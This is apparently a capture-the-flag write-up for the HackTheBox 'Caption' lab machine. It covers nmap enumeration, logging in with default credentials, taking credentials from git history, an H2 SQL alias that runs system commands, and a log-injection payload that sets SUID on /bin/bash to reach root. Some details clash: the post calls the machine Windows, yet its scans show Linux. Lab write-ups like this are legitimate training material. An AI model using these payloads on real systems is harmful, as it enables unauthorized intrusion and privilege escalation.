---
title: "Hackthebox: caption [Machine] [Season 6]"
author: c3l1kd
categories: [Hackthebox]
tags:
  [
    Evil-WinRM,
    Privilege Escalation,
    Reverse Shell,
    Nmap,
    wfuzz,
    Exploitation,
    Web Server,
  ]
render_with_liquid: false
img_path: /images/hackthebox_caption/
image:
  path: room_image.png
---
**Caption** on HackTheBox is a <code class="highlight">Windows</code> machine challenge that tests <code class="highlight">cybersecurity skills</code> by requiring users to exploit <code class="highlight">web server vulnerabilities</code>, gain a <code class="highlight">reverse shell</code>, escalate <code class="highlight">privileges</code>, and capture <code class="highlight">user</code> and <code class="highlight">root flags</code>. Participants must use tools like <code class="highlight">Nmap</code> and <code class="highlight">wfuzz</code> for <code class="highlight">reconnaissance</code>, analyze services such as <code class="highlight">SVN</code>, and apply <code class="highlight">enumeration techniques</code> to uncover hidden <code class="highlight">directories</code> and <code class="highlight">credentials</code>. By leveraging <code class="highlight">web vulnerabilities</code> and <code class="highlight">reverse shell techniques</code>, users navigate through the challenge, enhancing their understanding of <code class="highlight">cybersecurity concepts</code> while documenting their learning process.
<style>
    .highlight {
 background-color: #ffeb3b;
      padding: 0 5px;
      color: red;
      border-radius: 3px;
}
</style>
[![Hackthebox Room Link](room_banner.png)](https://app.hackthebox.com/machines/Caption)
## Initial Enumeration
### Nmap Scan
```console
$ nmap -sCV 10.10.11.33 — vv
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024–10–14 20:43 IST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:43
Completed NSE at 20:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:43
Completed NSE at 20:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:43
Completed NSE at 20:43, 0.00s elapsed
Initiating Ping Scan at 20:43
Scanning 10.10.11.33 [4 ports]
Completed Ping Scan at 20:43, 0.38s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:43
Completed Parallel DNS resolution of 1 host. at 20:43, 0.05s elapsed
Initiating SYN Stealth Scan at 20:43
Scanning 10.10.11.33 [1000 ports]
Discovered open port 22/tcp on 10.10.11.33
Discovered open port 80/tcp on 10.10.11.33
Discovered open port 8080/tcp on 10.10.11.33
Completed SYN Stealth Scan at 20:43, 2.94s elapsed (1000 total ports)
Initiating Service scan at 20:43
Scanning 3 services on 10.10.11.33
Completed Service scan at 20:44, 39.03s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.11.33.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:44
NSE Timing: About 98.82% done; ETC: 20:45 (0:00:00 remaining)
Completed NSE at 20:45, 55.92s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:45
Completed NSE at 20:45, 7.92s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:45
Completed NSE at 20:45, 0.00s elapsed
Nmap scan report for 10.10.11.33
Host is up, received reset ttl 63 (0.28s latency).
Scanned at 2024–10–14 20:43:46 IST for 106s
Not shown: 997 closed tcp ports (reset)
PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
| 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open http syn-ack ttl 63
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
| fingerprint-strings:
| DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, X11Probe:
| HTTP/1.1 400 Bad request
| Content-length: 90
| Cache-Control: no-cache
| Connection: close
| Content-Type: text/html
| <html><body><h1>400 Bad request</h1>
| Your browser sent an invalid request.
| </body></html>
| FourOhFourRequest, GetRequest, HTTPOptions:
| HTTP/1.1 301 Moved Permanently
| content-length: 0
| location: http://caption.htb
|_ connection: close
|_http-title: Did not follow redirect to http://caption.htb
8080/tcp open http-proxy syn-ack ttl 63
| fingerprint-strings:
| DNSStatusRequestTCP, DNSVersionBindReqTCP:
| HTTP/1.1 400 Bad Request
| Content-Type: text/html;charset=iso-8859–1
| Content-Length: 69
| Connection: close
| <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
| HTTPOptions:
| HTTP/1.1 200 OK
| Date: Mon, 14 Oct 2024 15:14:02 GMT
| Set-Cookie: JSESSIONID=node0ez97tu0z21c91u7opxqwzgo7y2.node0; Path=/; HttpOnly
| Expires: Thu, 01 Jan 1970 00:00:00 GMT
| Content-Type: text/html;charset=utf-8
| Allow: GET,HEAD,POST,OPTIONS
| Content-Length: 0
| Help:
| HTTP/1.1 400 Bad Request
| Content-Type: text/html;charset=iso-8859–1
| Content-Length: 49
| Connection: close
| <h1>Bad Message 400</h1><pre>reason: No URI</pre>
| RPCCheck:
| HTTP/1.1 400 Bad Request
| Content-Type: text/html;charset=iso-8859–1
| Content-Length: 71
| Connection: close
| <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
| RTSPRequest:
| HTTP/1.1 505 HTTP Version Not Supported
| Content-Type: text/html;charset=iso-8859–1
| Content-Length: 58
| Connection: close
| <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
| Socks4:
| HTTP/1.1 400 Bad Request
| Content-Type: text/html;charset=iso-8859–1
| Content-Length: 69
| Connection: close
| <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
| Socks5:
| HTTP/1.1 400 Bad Request
| Content-Type: text/html;charset=iso-8859–1
| Content-Length: 69
| Connection: close
|_ <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=10/14%Time=670D3534%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,66,"HTTP/1\.1\x20301\x20Moved\x20Permanently\r\ncontent-leng
SF:th:\x200\r\nlocation:\x20http://caption\.htb\r\nconnection:\x20close\r\
SF:n\r\n")%r(HTTPOptions,66,"HTTP/1\.1\x20301\x20Moved\x20Permanently\r\nc
SF:ontent-length:\x200\r\nlocation:\x20http://caption\.htb\r\nconnection:\
SF:x20close\r\n\r\n")%r(RTSPRequest,CF,"HTTP/1\.1\x20400\x20Bad\x20request
SF:\r\nContent-length:\x2090\r\nCache-Control:\x20no-cache\r\nConnection:\
SF:x20close\r\nContent-Type:\x20text/html\r\n\r\n<html><body><h1>400\x20Ba
SF:d\x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20request\
SF:.\n</body></html>\n")%r(X11Probe,CF,"HTTP/1\.1\x20400\x20Bad\x20request
SF:\r\nContent-length:\x2090\r\nCache-Control:\x20no-cache\r\nConnection:\
SF:x20close\r\nContent-Type:\x20text/html\r\n\r\n<html><body><h1>400\x20Ba
SF:d\x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20request\
SF:.\n</body></html>\n")%r(FourOhFourRequest,66,"HTTP/1\.1\x20301\x20Moved
SF:\x20Permanently\r\ncontent-length:\x200\r\nlocation:\x20http://caption\
SF:.htb\r\nconnection:\x20close\r\n\r\n")%r(RPCCheck,CF,"HTTP/1\.1\x20400\
SF:x20Bad\x20request\r\nContent-length:\x2090\r\nCache-Control:\x20no-cach
SF:e\r\nConnection:\x20close\r\nContent-Type:\x20text/html\r\n\r\n<html><b
SF:ody><h1>400\x20Bad\x20request</h1>\nYour\x20browser\x20sent\x20an\x20in
SF:valid\x20request\.\n</body></html>\n")%r(DNSVersionBindReqTCP,CF,"HTTP/
SF:1\.1\x20400\x20Bad\x20request\r\nContent-length:\x2090\r\nCache-Control
SF::\x20no-cache\r\nConnection:\x20close\r\nContent-Type:\x20text/html\r\n
SF:\r\n<html><body><h1>400\x20Bad\x20request</h1>\nYour\x20browser\x20sent
SF:\x20an\x20invalid\x20request\.\n</body></html>\n")%r(DNSStatusRequestTC
SF:P,CF,"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-length:\x2090\r\nCa
SF:che-Control:\x20no-cache\r\nConnection:\x20close\r\nContent-Type:\x20te
SF:xt/html\r\n\r\n<html><body><h1>400\x20Bad\x20request</h1>\nYour\x20brow
SF:ser\x20sent\x20an\x20invalid\x20request\.\n</body></html>\n")%r(Help,CF
SF:,"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-length:\x2090\r\nCache-
SF:Control:\x20no-cache\r\nConnection:\x20close\r\nContent-Type:\x20text/h
SF:tml\r\n\r\n<html><body><h1>400\x20Bad\x20request</h1>\nYour\x20browser\
SF:x20sent\x20an\x20invalid\x20request\.\n</body></html>\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8080-TCP:V=7.94SVN%I=7%D=10/14%Time=670D353A%P=x86_64-pc-linux-gnu%
SF:r(HTTPOptions,108,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2014\x20Oct
SF:\x202024\x2015:14:02\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node0ez97tu0z2
SF:1c91u7opxqwzgo7y2\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2
SF:001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html;cha
SF:rset=utf-8\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r
SF:\n\r\n")%r(RTSPRequest,B8,"HTTP/1\.1\x20505\x20HTTP\x20Version\x20Not\x
SF:20Supported\r\nContent-Type:\x20text/html;charset=iso-8859–1\r\nContent
SF:-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20505
SF:</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(Socks5,B4,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html;charset=iso-8859
SF:-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20M
SF:essage\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x5</pre
SF:>")%r(Socks4,B4,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/html;charset=iso-8859–1\r\nContent-Length:\x2069\r\nConnection:\x
SF:20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x2
SF:0character\x20CNTL=0x4</pre>")%r(RPCCheck,B6,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nContent-Type:\x20text/html;charset=iso-8859–1\r\nContent-L
SF:ength:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</
SF:h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x80</pre>")%r(DNSVers
SF:ionBindReqTCP,B4,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/html;charset=iso-8859–1\r\nContent-Length:\x2069\r\nConnection:
SF:x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x
SF:20character\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,B4,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/html;charset=iso-8859–1\
SF:r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Mess
SF:age\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</pre>")
SF:%r(Help,A0,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/html;charset=iso-8859–1\r\nContent-Length:\x2049\r\nConnection:\x20clo
SF:se\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x20URI</pre>SF:");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:45
Completed NSE at 20:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:45
Completed NSE at 20:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:45
Completed NSE at 20:45, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.50 seconds
Raw packets sent: 1078 (47.408KB) | Rcvd: 1075 (43.012KB)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http            Apache httpd 2.4.52 ((Ubuntu))
8080/tcp open  http-proxy      Apache httpd 2.4.52 ((Ubuntu))

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are five open ports:

- **22** (SSH)
- **80/tcp**  (http)
- **8080/tcp**  (http-proxy)

Now lets add Hostname to the `/etc/hosts` file.
## /etc/hosts
```console
$ cat /etc/hosts
127.0.0.1   localhost
127.0.1.1   kali       kali

10.10.11.33 caption.htb
...
```
![/etc/hosts](01.png){: width="1200" height="800" }


## Discovering Port 80
I have a open port in the nmap that is port number `80` by enumerating this we can find any further information for further use
`http://caption.htb`
![Discovering Port 80](02.png){: width="1200" height="800" }
by using the port number of `80` an interface has opened which displays an the some login forms and the URL shows as `http://caption.htb` , so I have tested some of the `default credentials` as the

username : `admin / root`

password : `admin / root`

## Discovering Port 8080

but didn't got any information by using the some `default credentials` and I have tried using the second port number `8080` `Gitbucket`
![Discovering Port 8080](03.png){: width="1200" height="800" }

By opening the url path with port number `8080` that is an `Gitbucker` and also tried some `default credentials` and it was successful.
![Discovering Port 8080](04.png){: width="1200" height="800" }

Now Enumeration for the machine

I have searched for the repositories for the further use of it:

- **Logservice**
- **Caption-Portal**

## Revealing some of the credentials
Next step was giving an try into those the repositories and checking their particular activities for any sensitive information that can be found

Revealing some of the `credentials` vis `Git History` which is present in the interface

![Discovering Port 8080](05.png){: width="1200" height="800" }

In the `Caption — Portal` repository , I have found a sensitive information as credentials for logging into the web portal that has been hosted in the `port number 80` , if you didn't find it heres the hink for it always check commit histories.

Taking those credentials and logging in the `port number 80`
![/etc/hosts](06.png){: width="1200" height="800" }

With the help of the creds I gained an low level access now we have to escalate the privileges of it .

For further information by some random guess which I have done on one machine it is trying sql injection in interface ( Git bucket ) . I didn't get any HTTP service information so I returned to the system administration section and here I have noticed an viewer of the database which manages the H2 database and it is vulnerable to the RCE attack by using the sql . I have used an exploit which found on open internet that execute the command :

```console
CREATE ALIAS REVEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {

java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");

return s.hasNext() ? s.next() : "";

}$$;
```
![/etc/hosts](07.png){: width="1200" height="800" }

After executing this, we can execute our commands.

![/etc/hosts](08.png){: width="1200" height="800" }

Trying SSH in the Box which can give us an information or any hint

as i have went through margo's files, I found something interesting — a private SSH key! I saved it locally and used it to log into the system as margo.

```console
└─# ssh -i margo_key margo@caption.htb 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0–119-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Mon Sep 27 6:33:10 PM UTC 2024 System load: 0.0 Processes: 233 Usage of /: 68.7% of 8.76GB Users logged in: 0 Memory usage: 17% IPv4 address for eth0: 10.129.46.159 Swap usage: 0%
```
After copying the key and setting the proper permissions, I was able to SSH into the machine as Margo.

Now let's check for user flag.

![/etc/hosts](09.png){: width="1200" height="800" }

In `user.txt` I got the user flag and I am not mentioning it for the privacy of the guidelines of HTB

Now let's find out root flag by the Privilege Escalation.

Here I have done exploiting LogService

One of the most interesting parts of this box was the Logservice repository. After cloning it from GitBucket, I saw that it contained a Thrift-based service. The key here was generating the Python client to interact with the LogService.

First, I cloned the LogServicerepository:
>git clone http://caption.htb:8080/git/root/Logservice.git
>changing the directory to the logservice
>cd Logservice

Next, I generated the Python client code using the Thrift command:

`thrift --gen py log_service.thrift`

This generated the necessary Python client code to interact with the LogService.

Creating a Malicious Log File

To escalate our privileges, I have created a log file that, when processed by the LogService, would set the SUID bit on `/bin/bash`. This is the crucial part of the exploit.

I created the malicious log file on the target machine:
```console
echo "127.0.0.1 \"user-agent\":\"' chmod +s /bin/bash #\"" > /tmp/malicious.log
```
Port Forwarding and Running the Exploit

To run the Python client locally, I set up port forwarding between my local machine and the target:

```console
ssh -L 9090:127.0.0.1:9090 margo@caption.htb -N -f
```
Next, I used a Python script to communicate with the LogService and process the malicious log file:

Running the script:
```console
python3 script.py
```
Now, the SUID bit is set on `/bin/bash`, allowing us to escalate privileges and gain a root shell.
Checking the permissions:
```console
ls -la /bin/bash
```
Executing the bash shell with elevated privileges:
```console
/bin/bash -p
```
Finally, we are root!
```console
whoami
root
```
Capture the Root Flag
The last step is to navigate to the /root directory and capture the root flag:
```console
cat /root/root.txt
```
![/etc/hosts](10.png){: width="1200" height="800" }

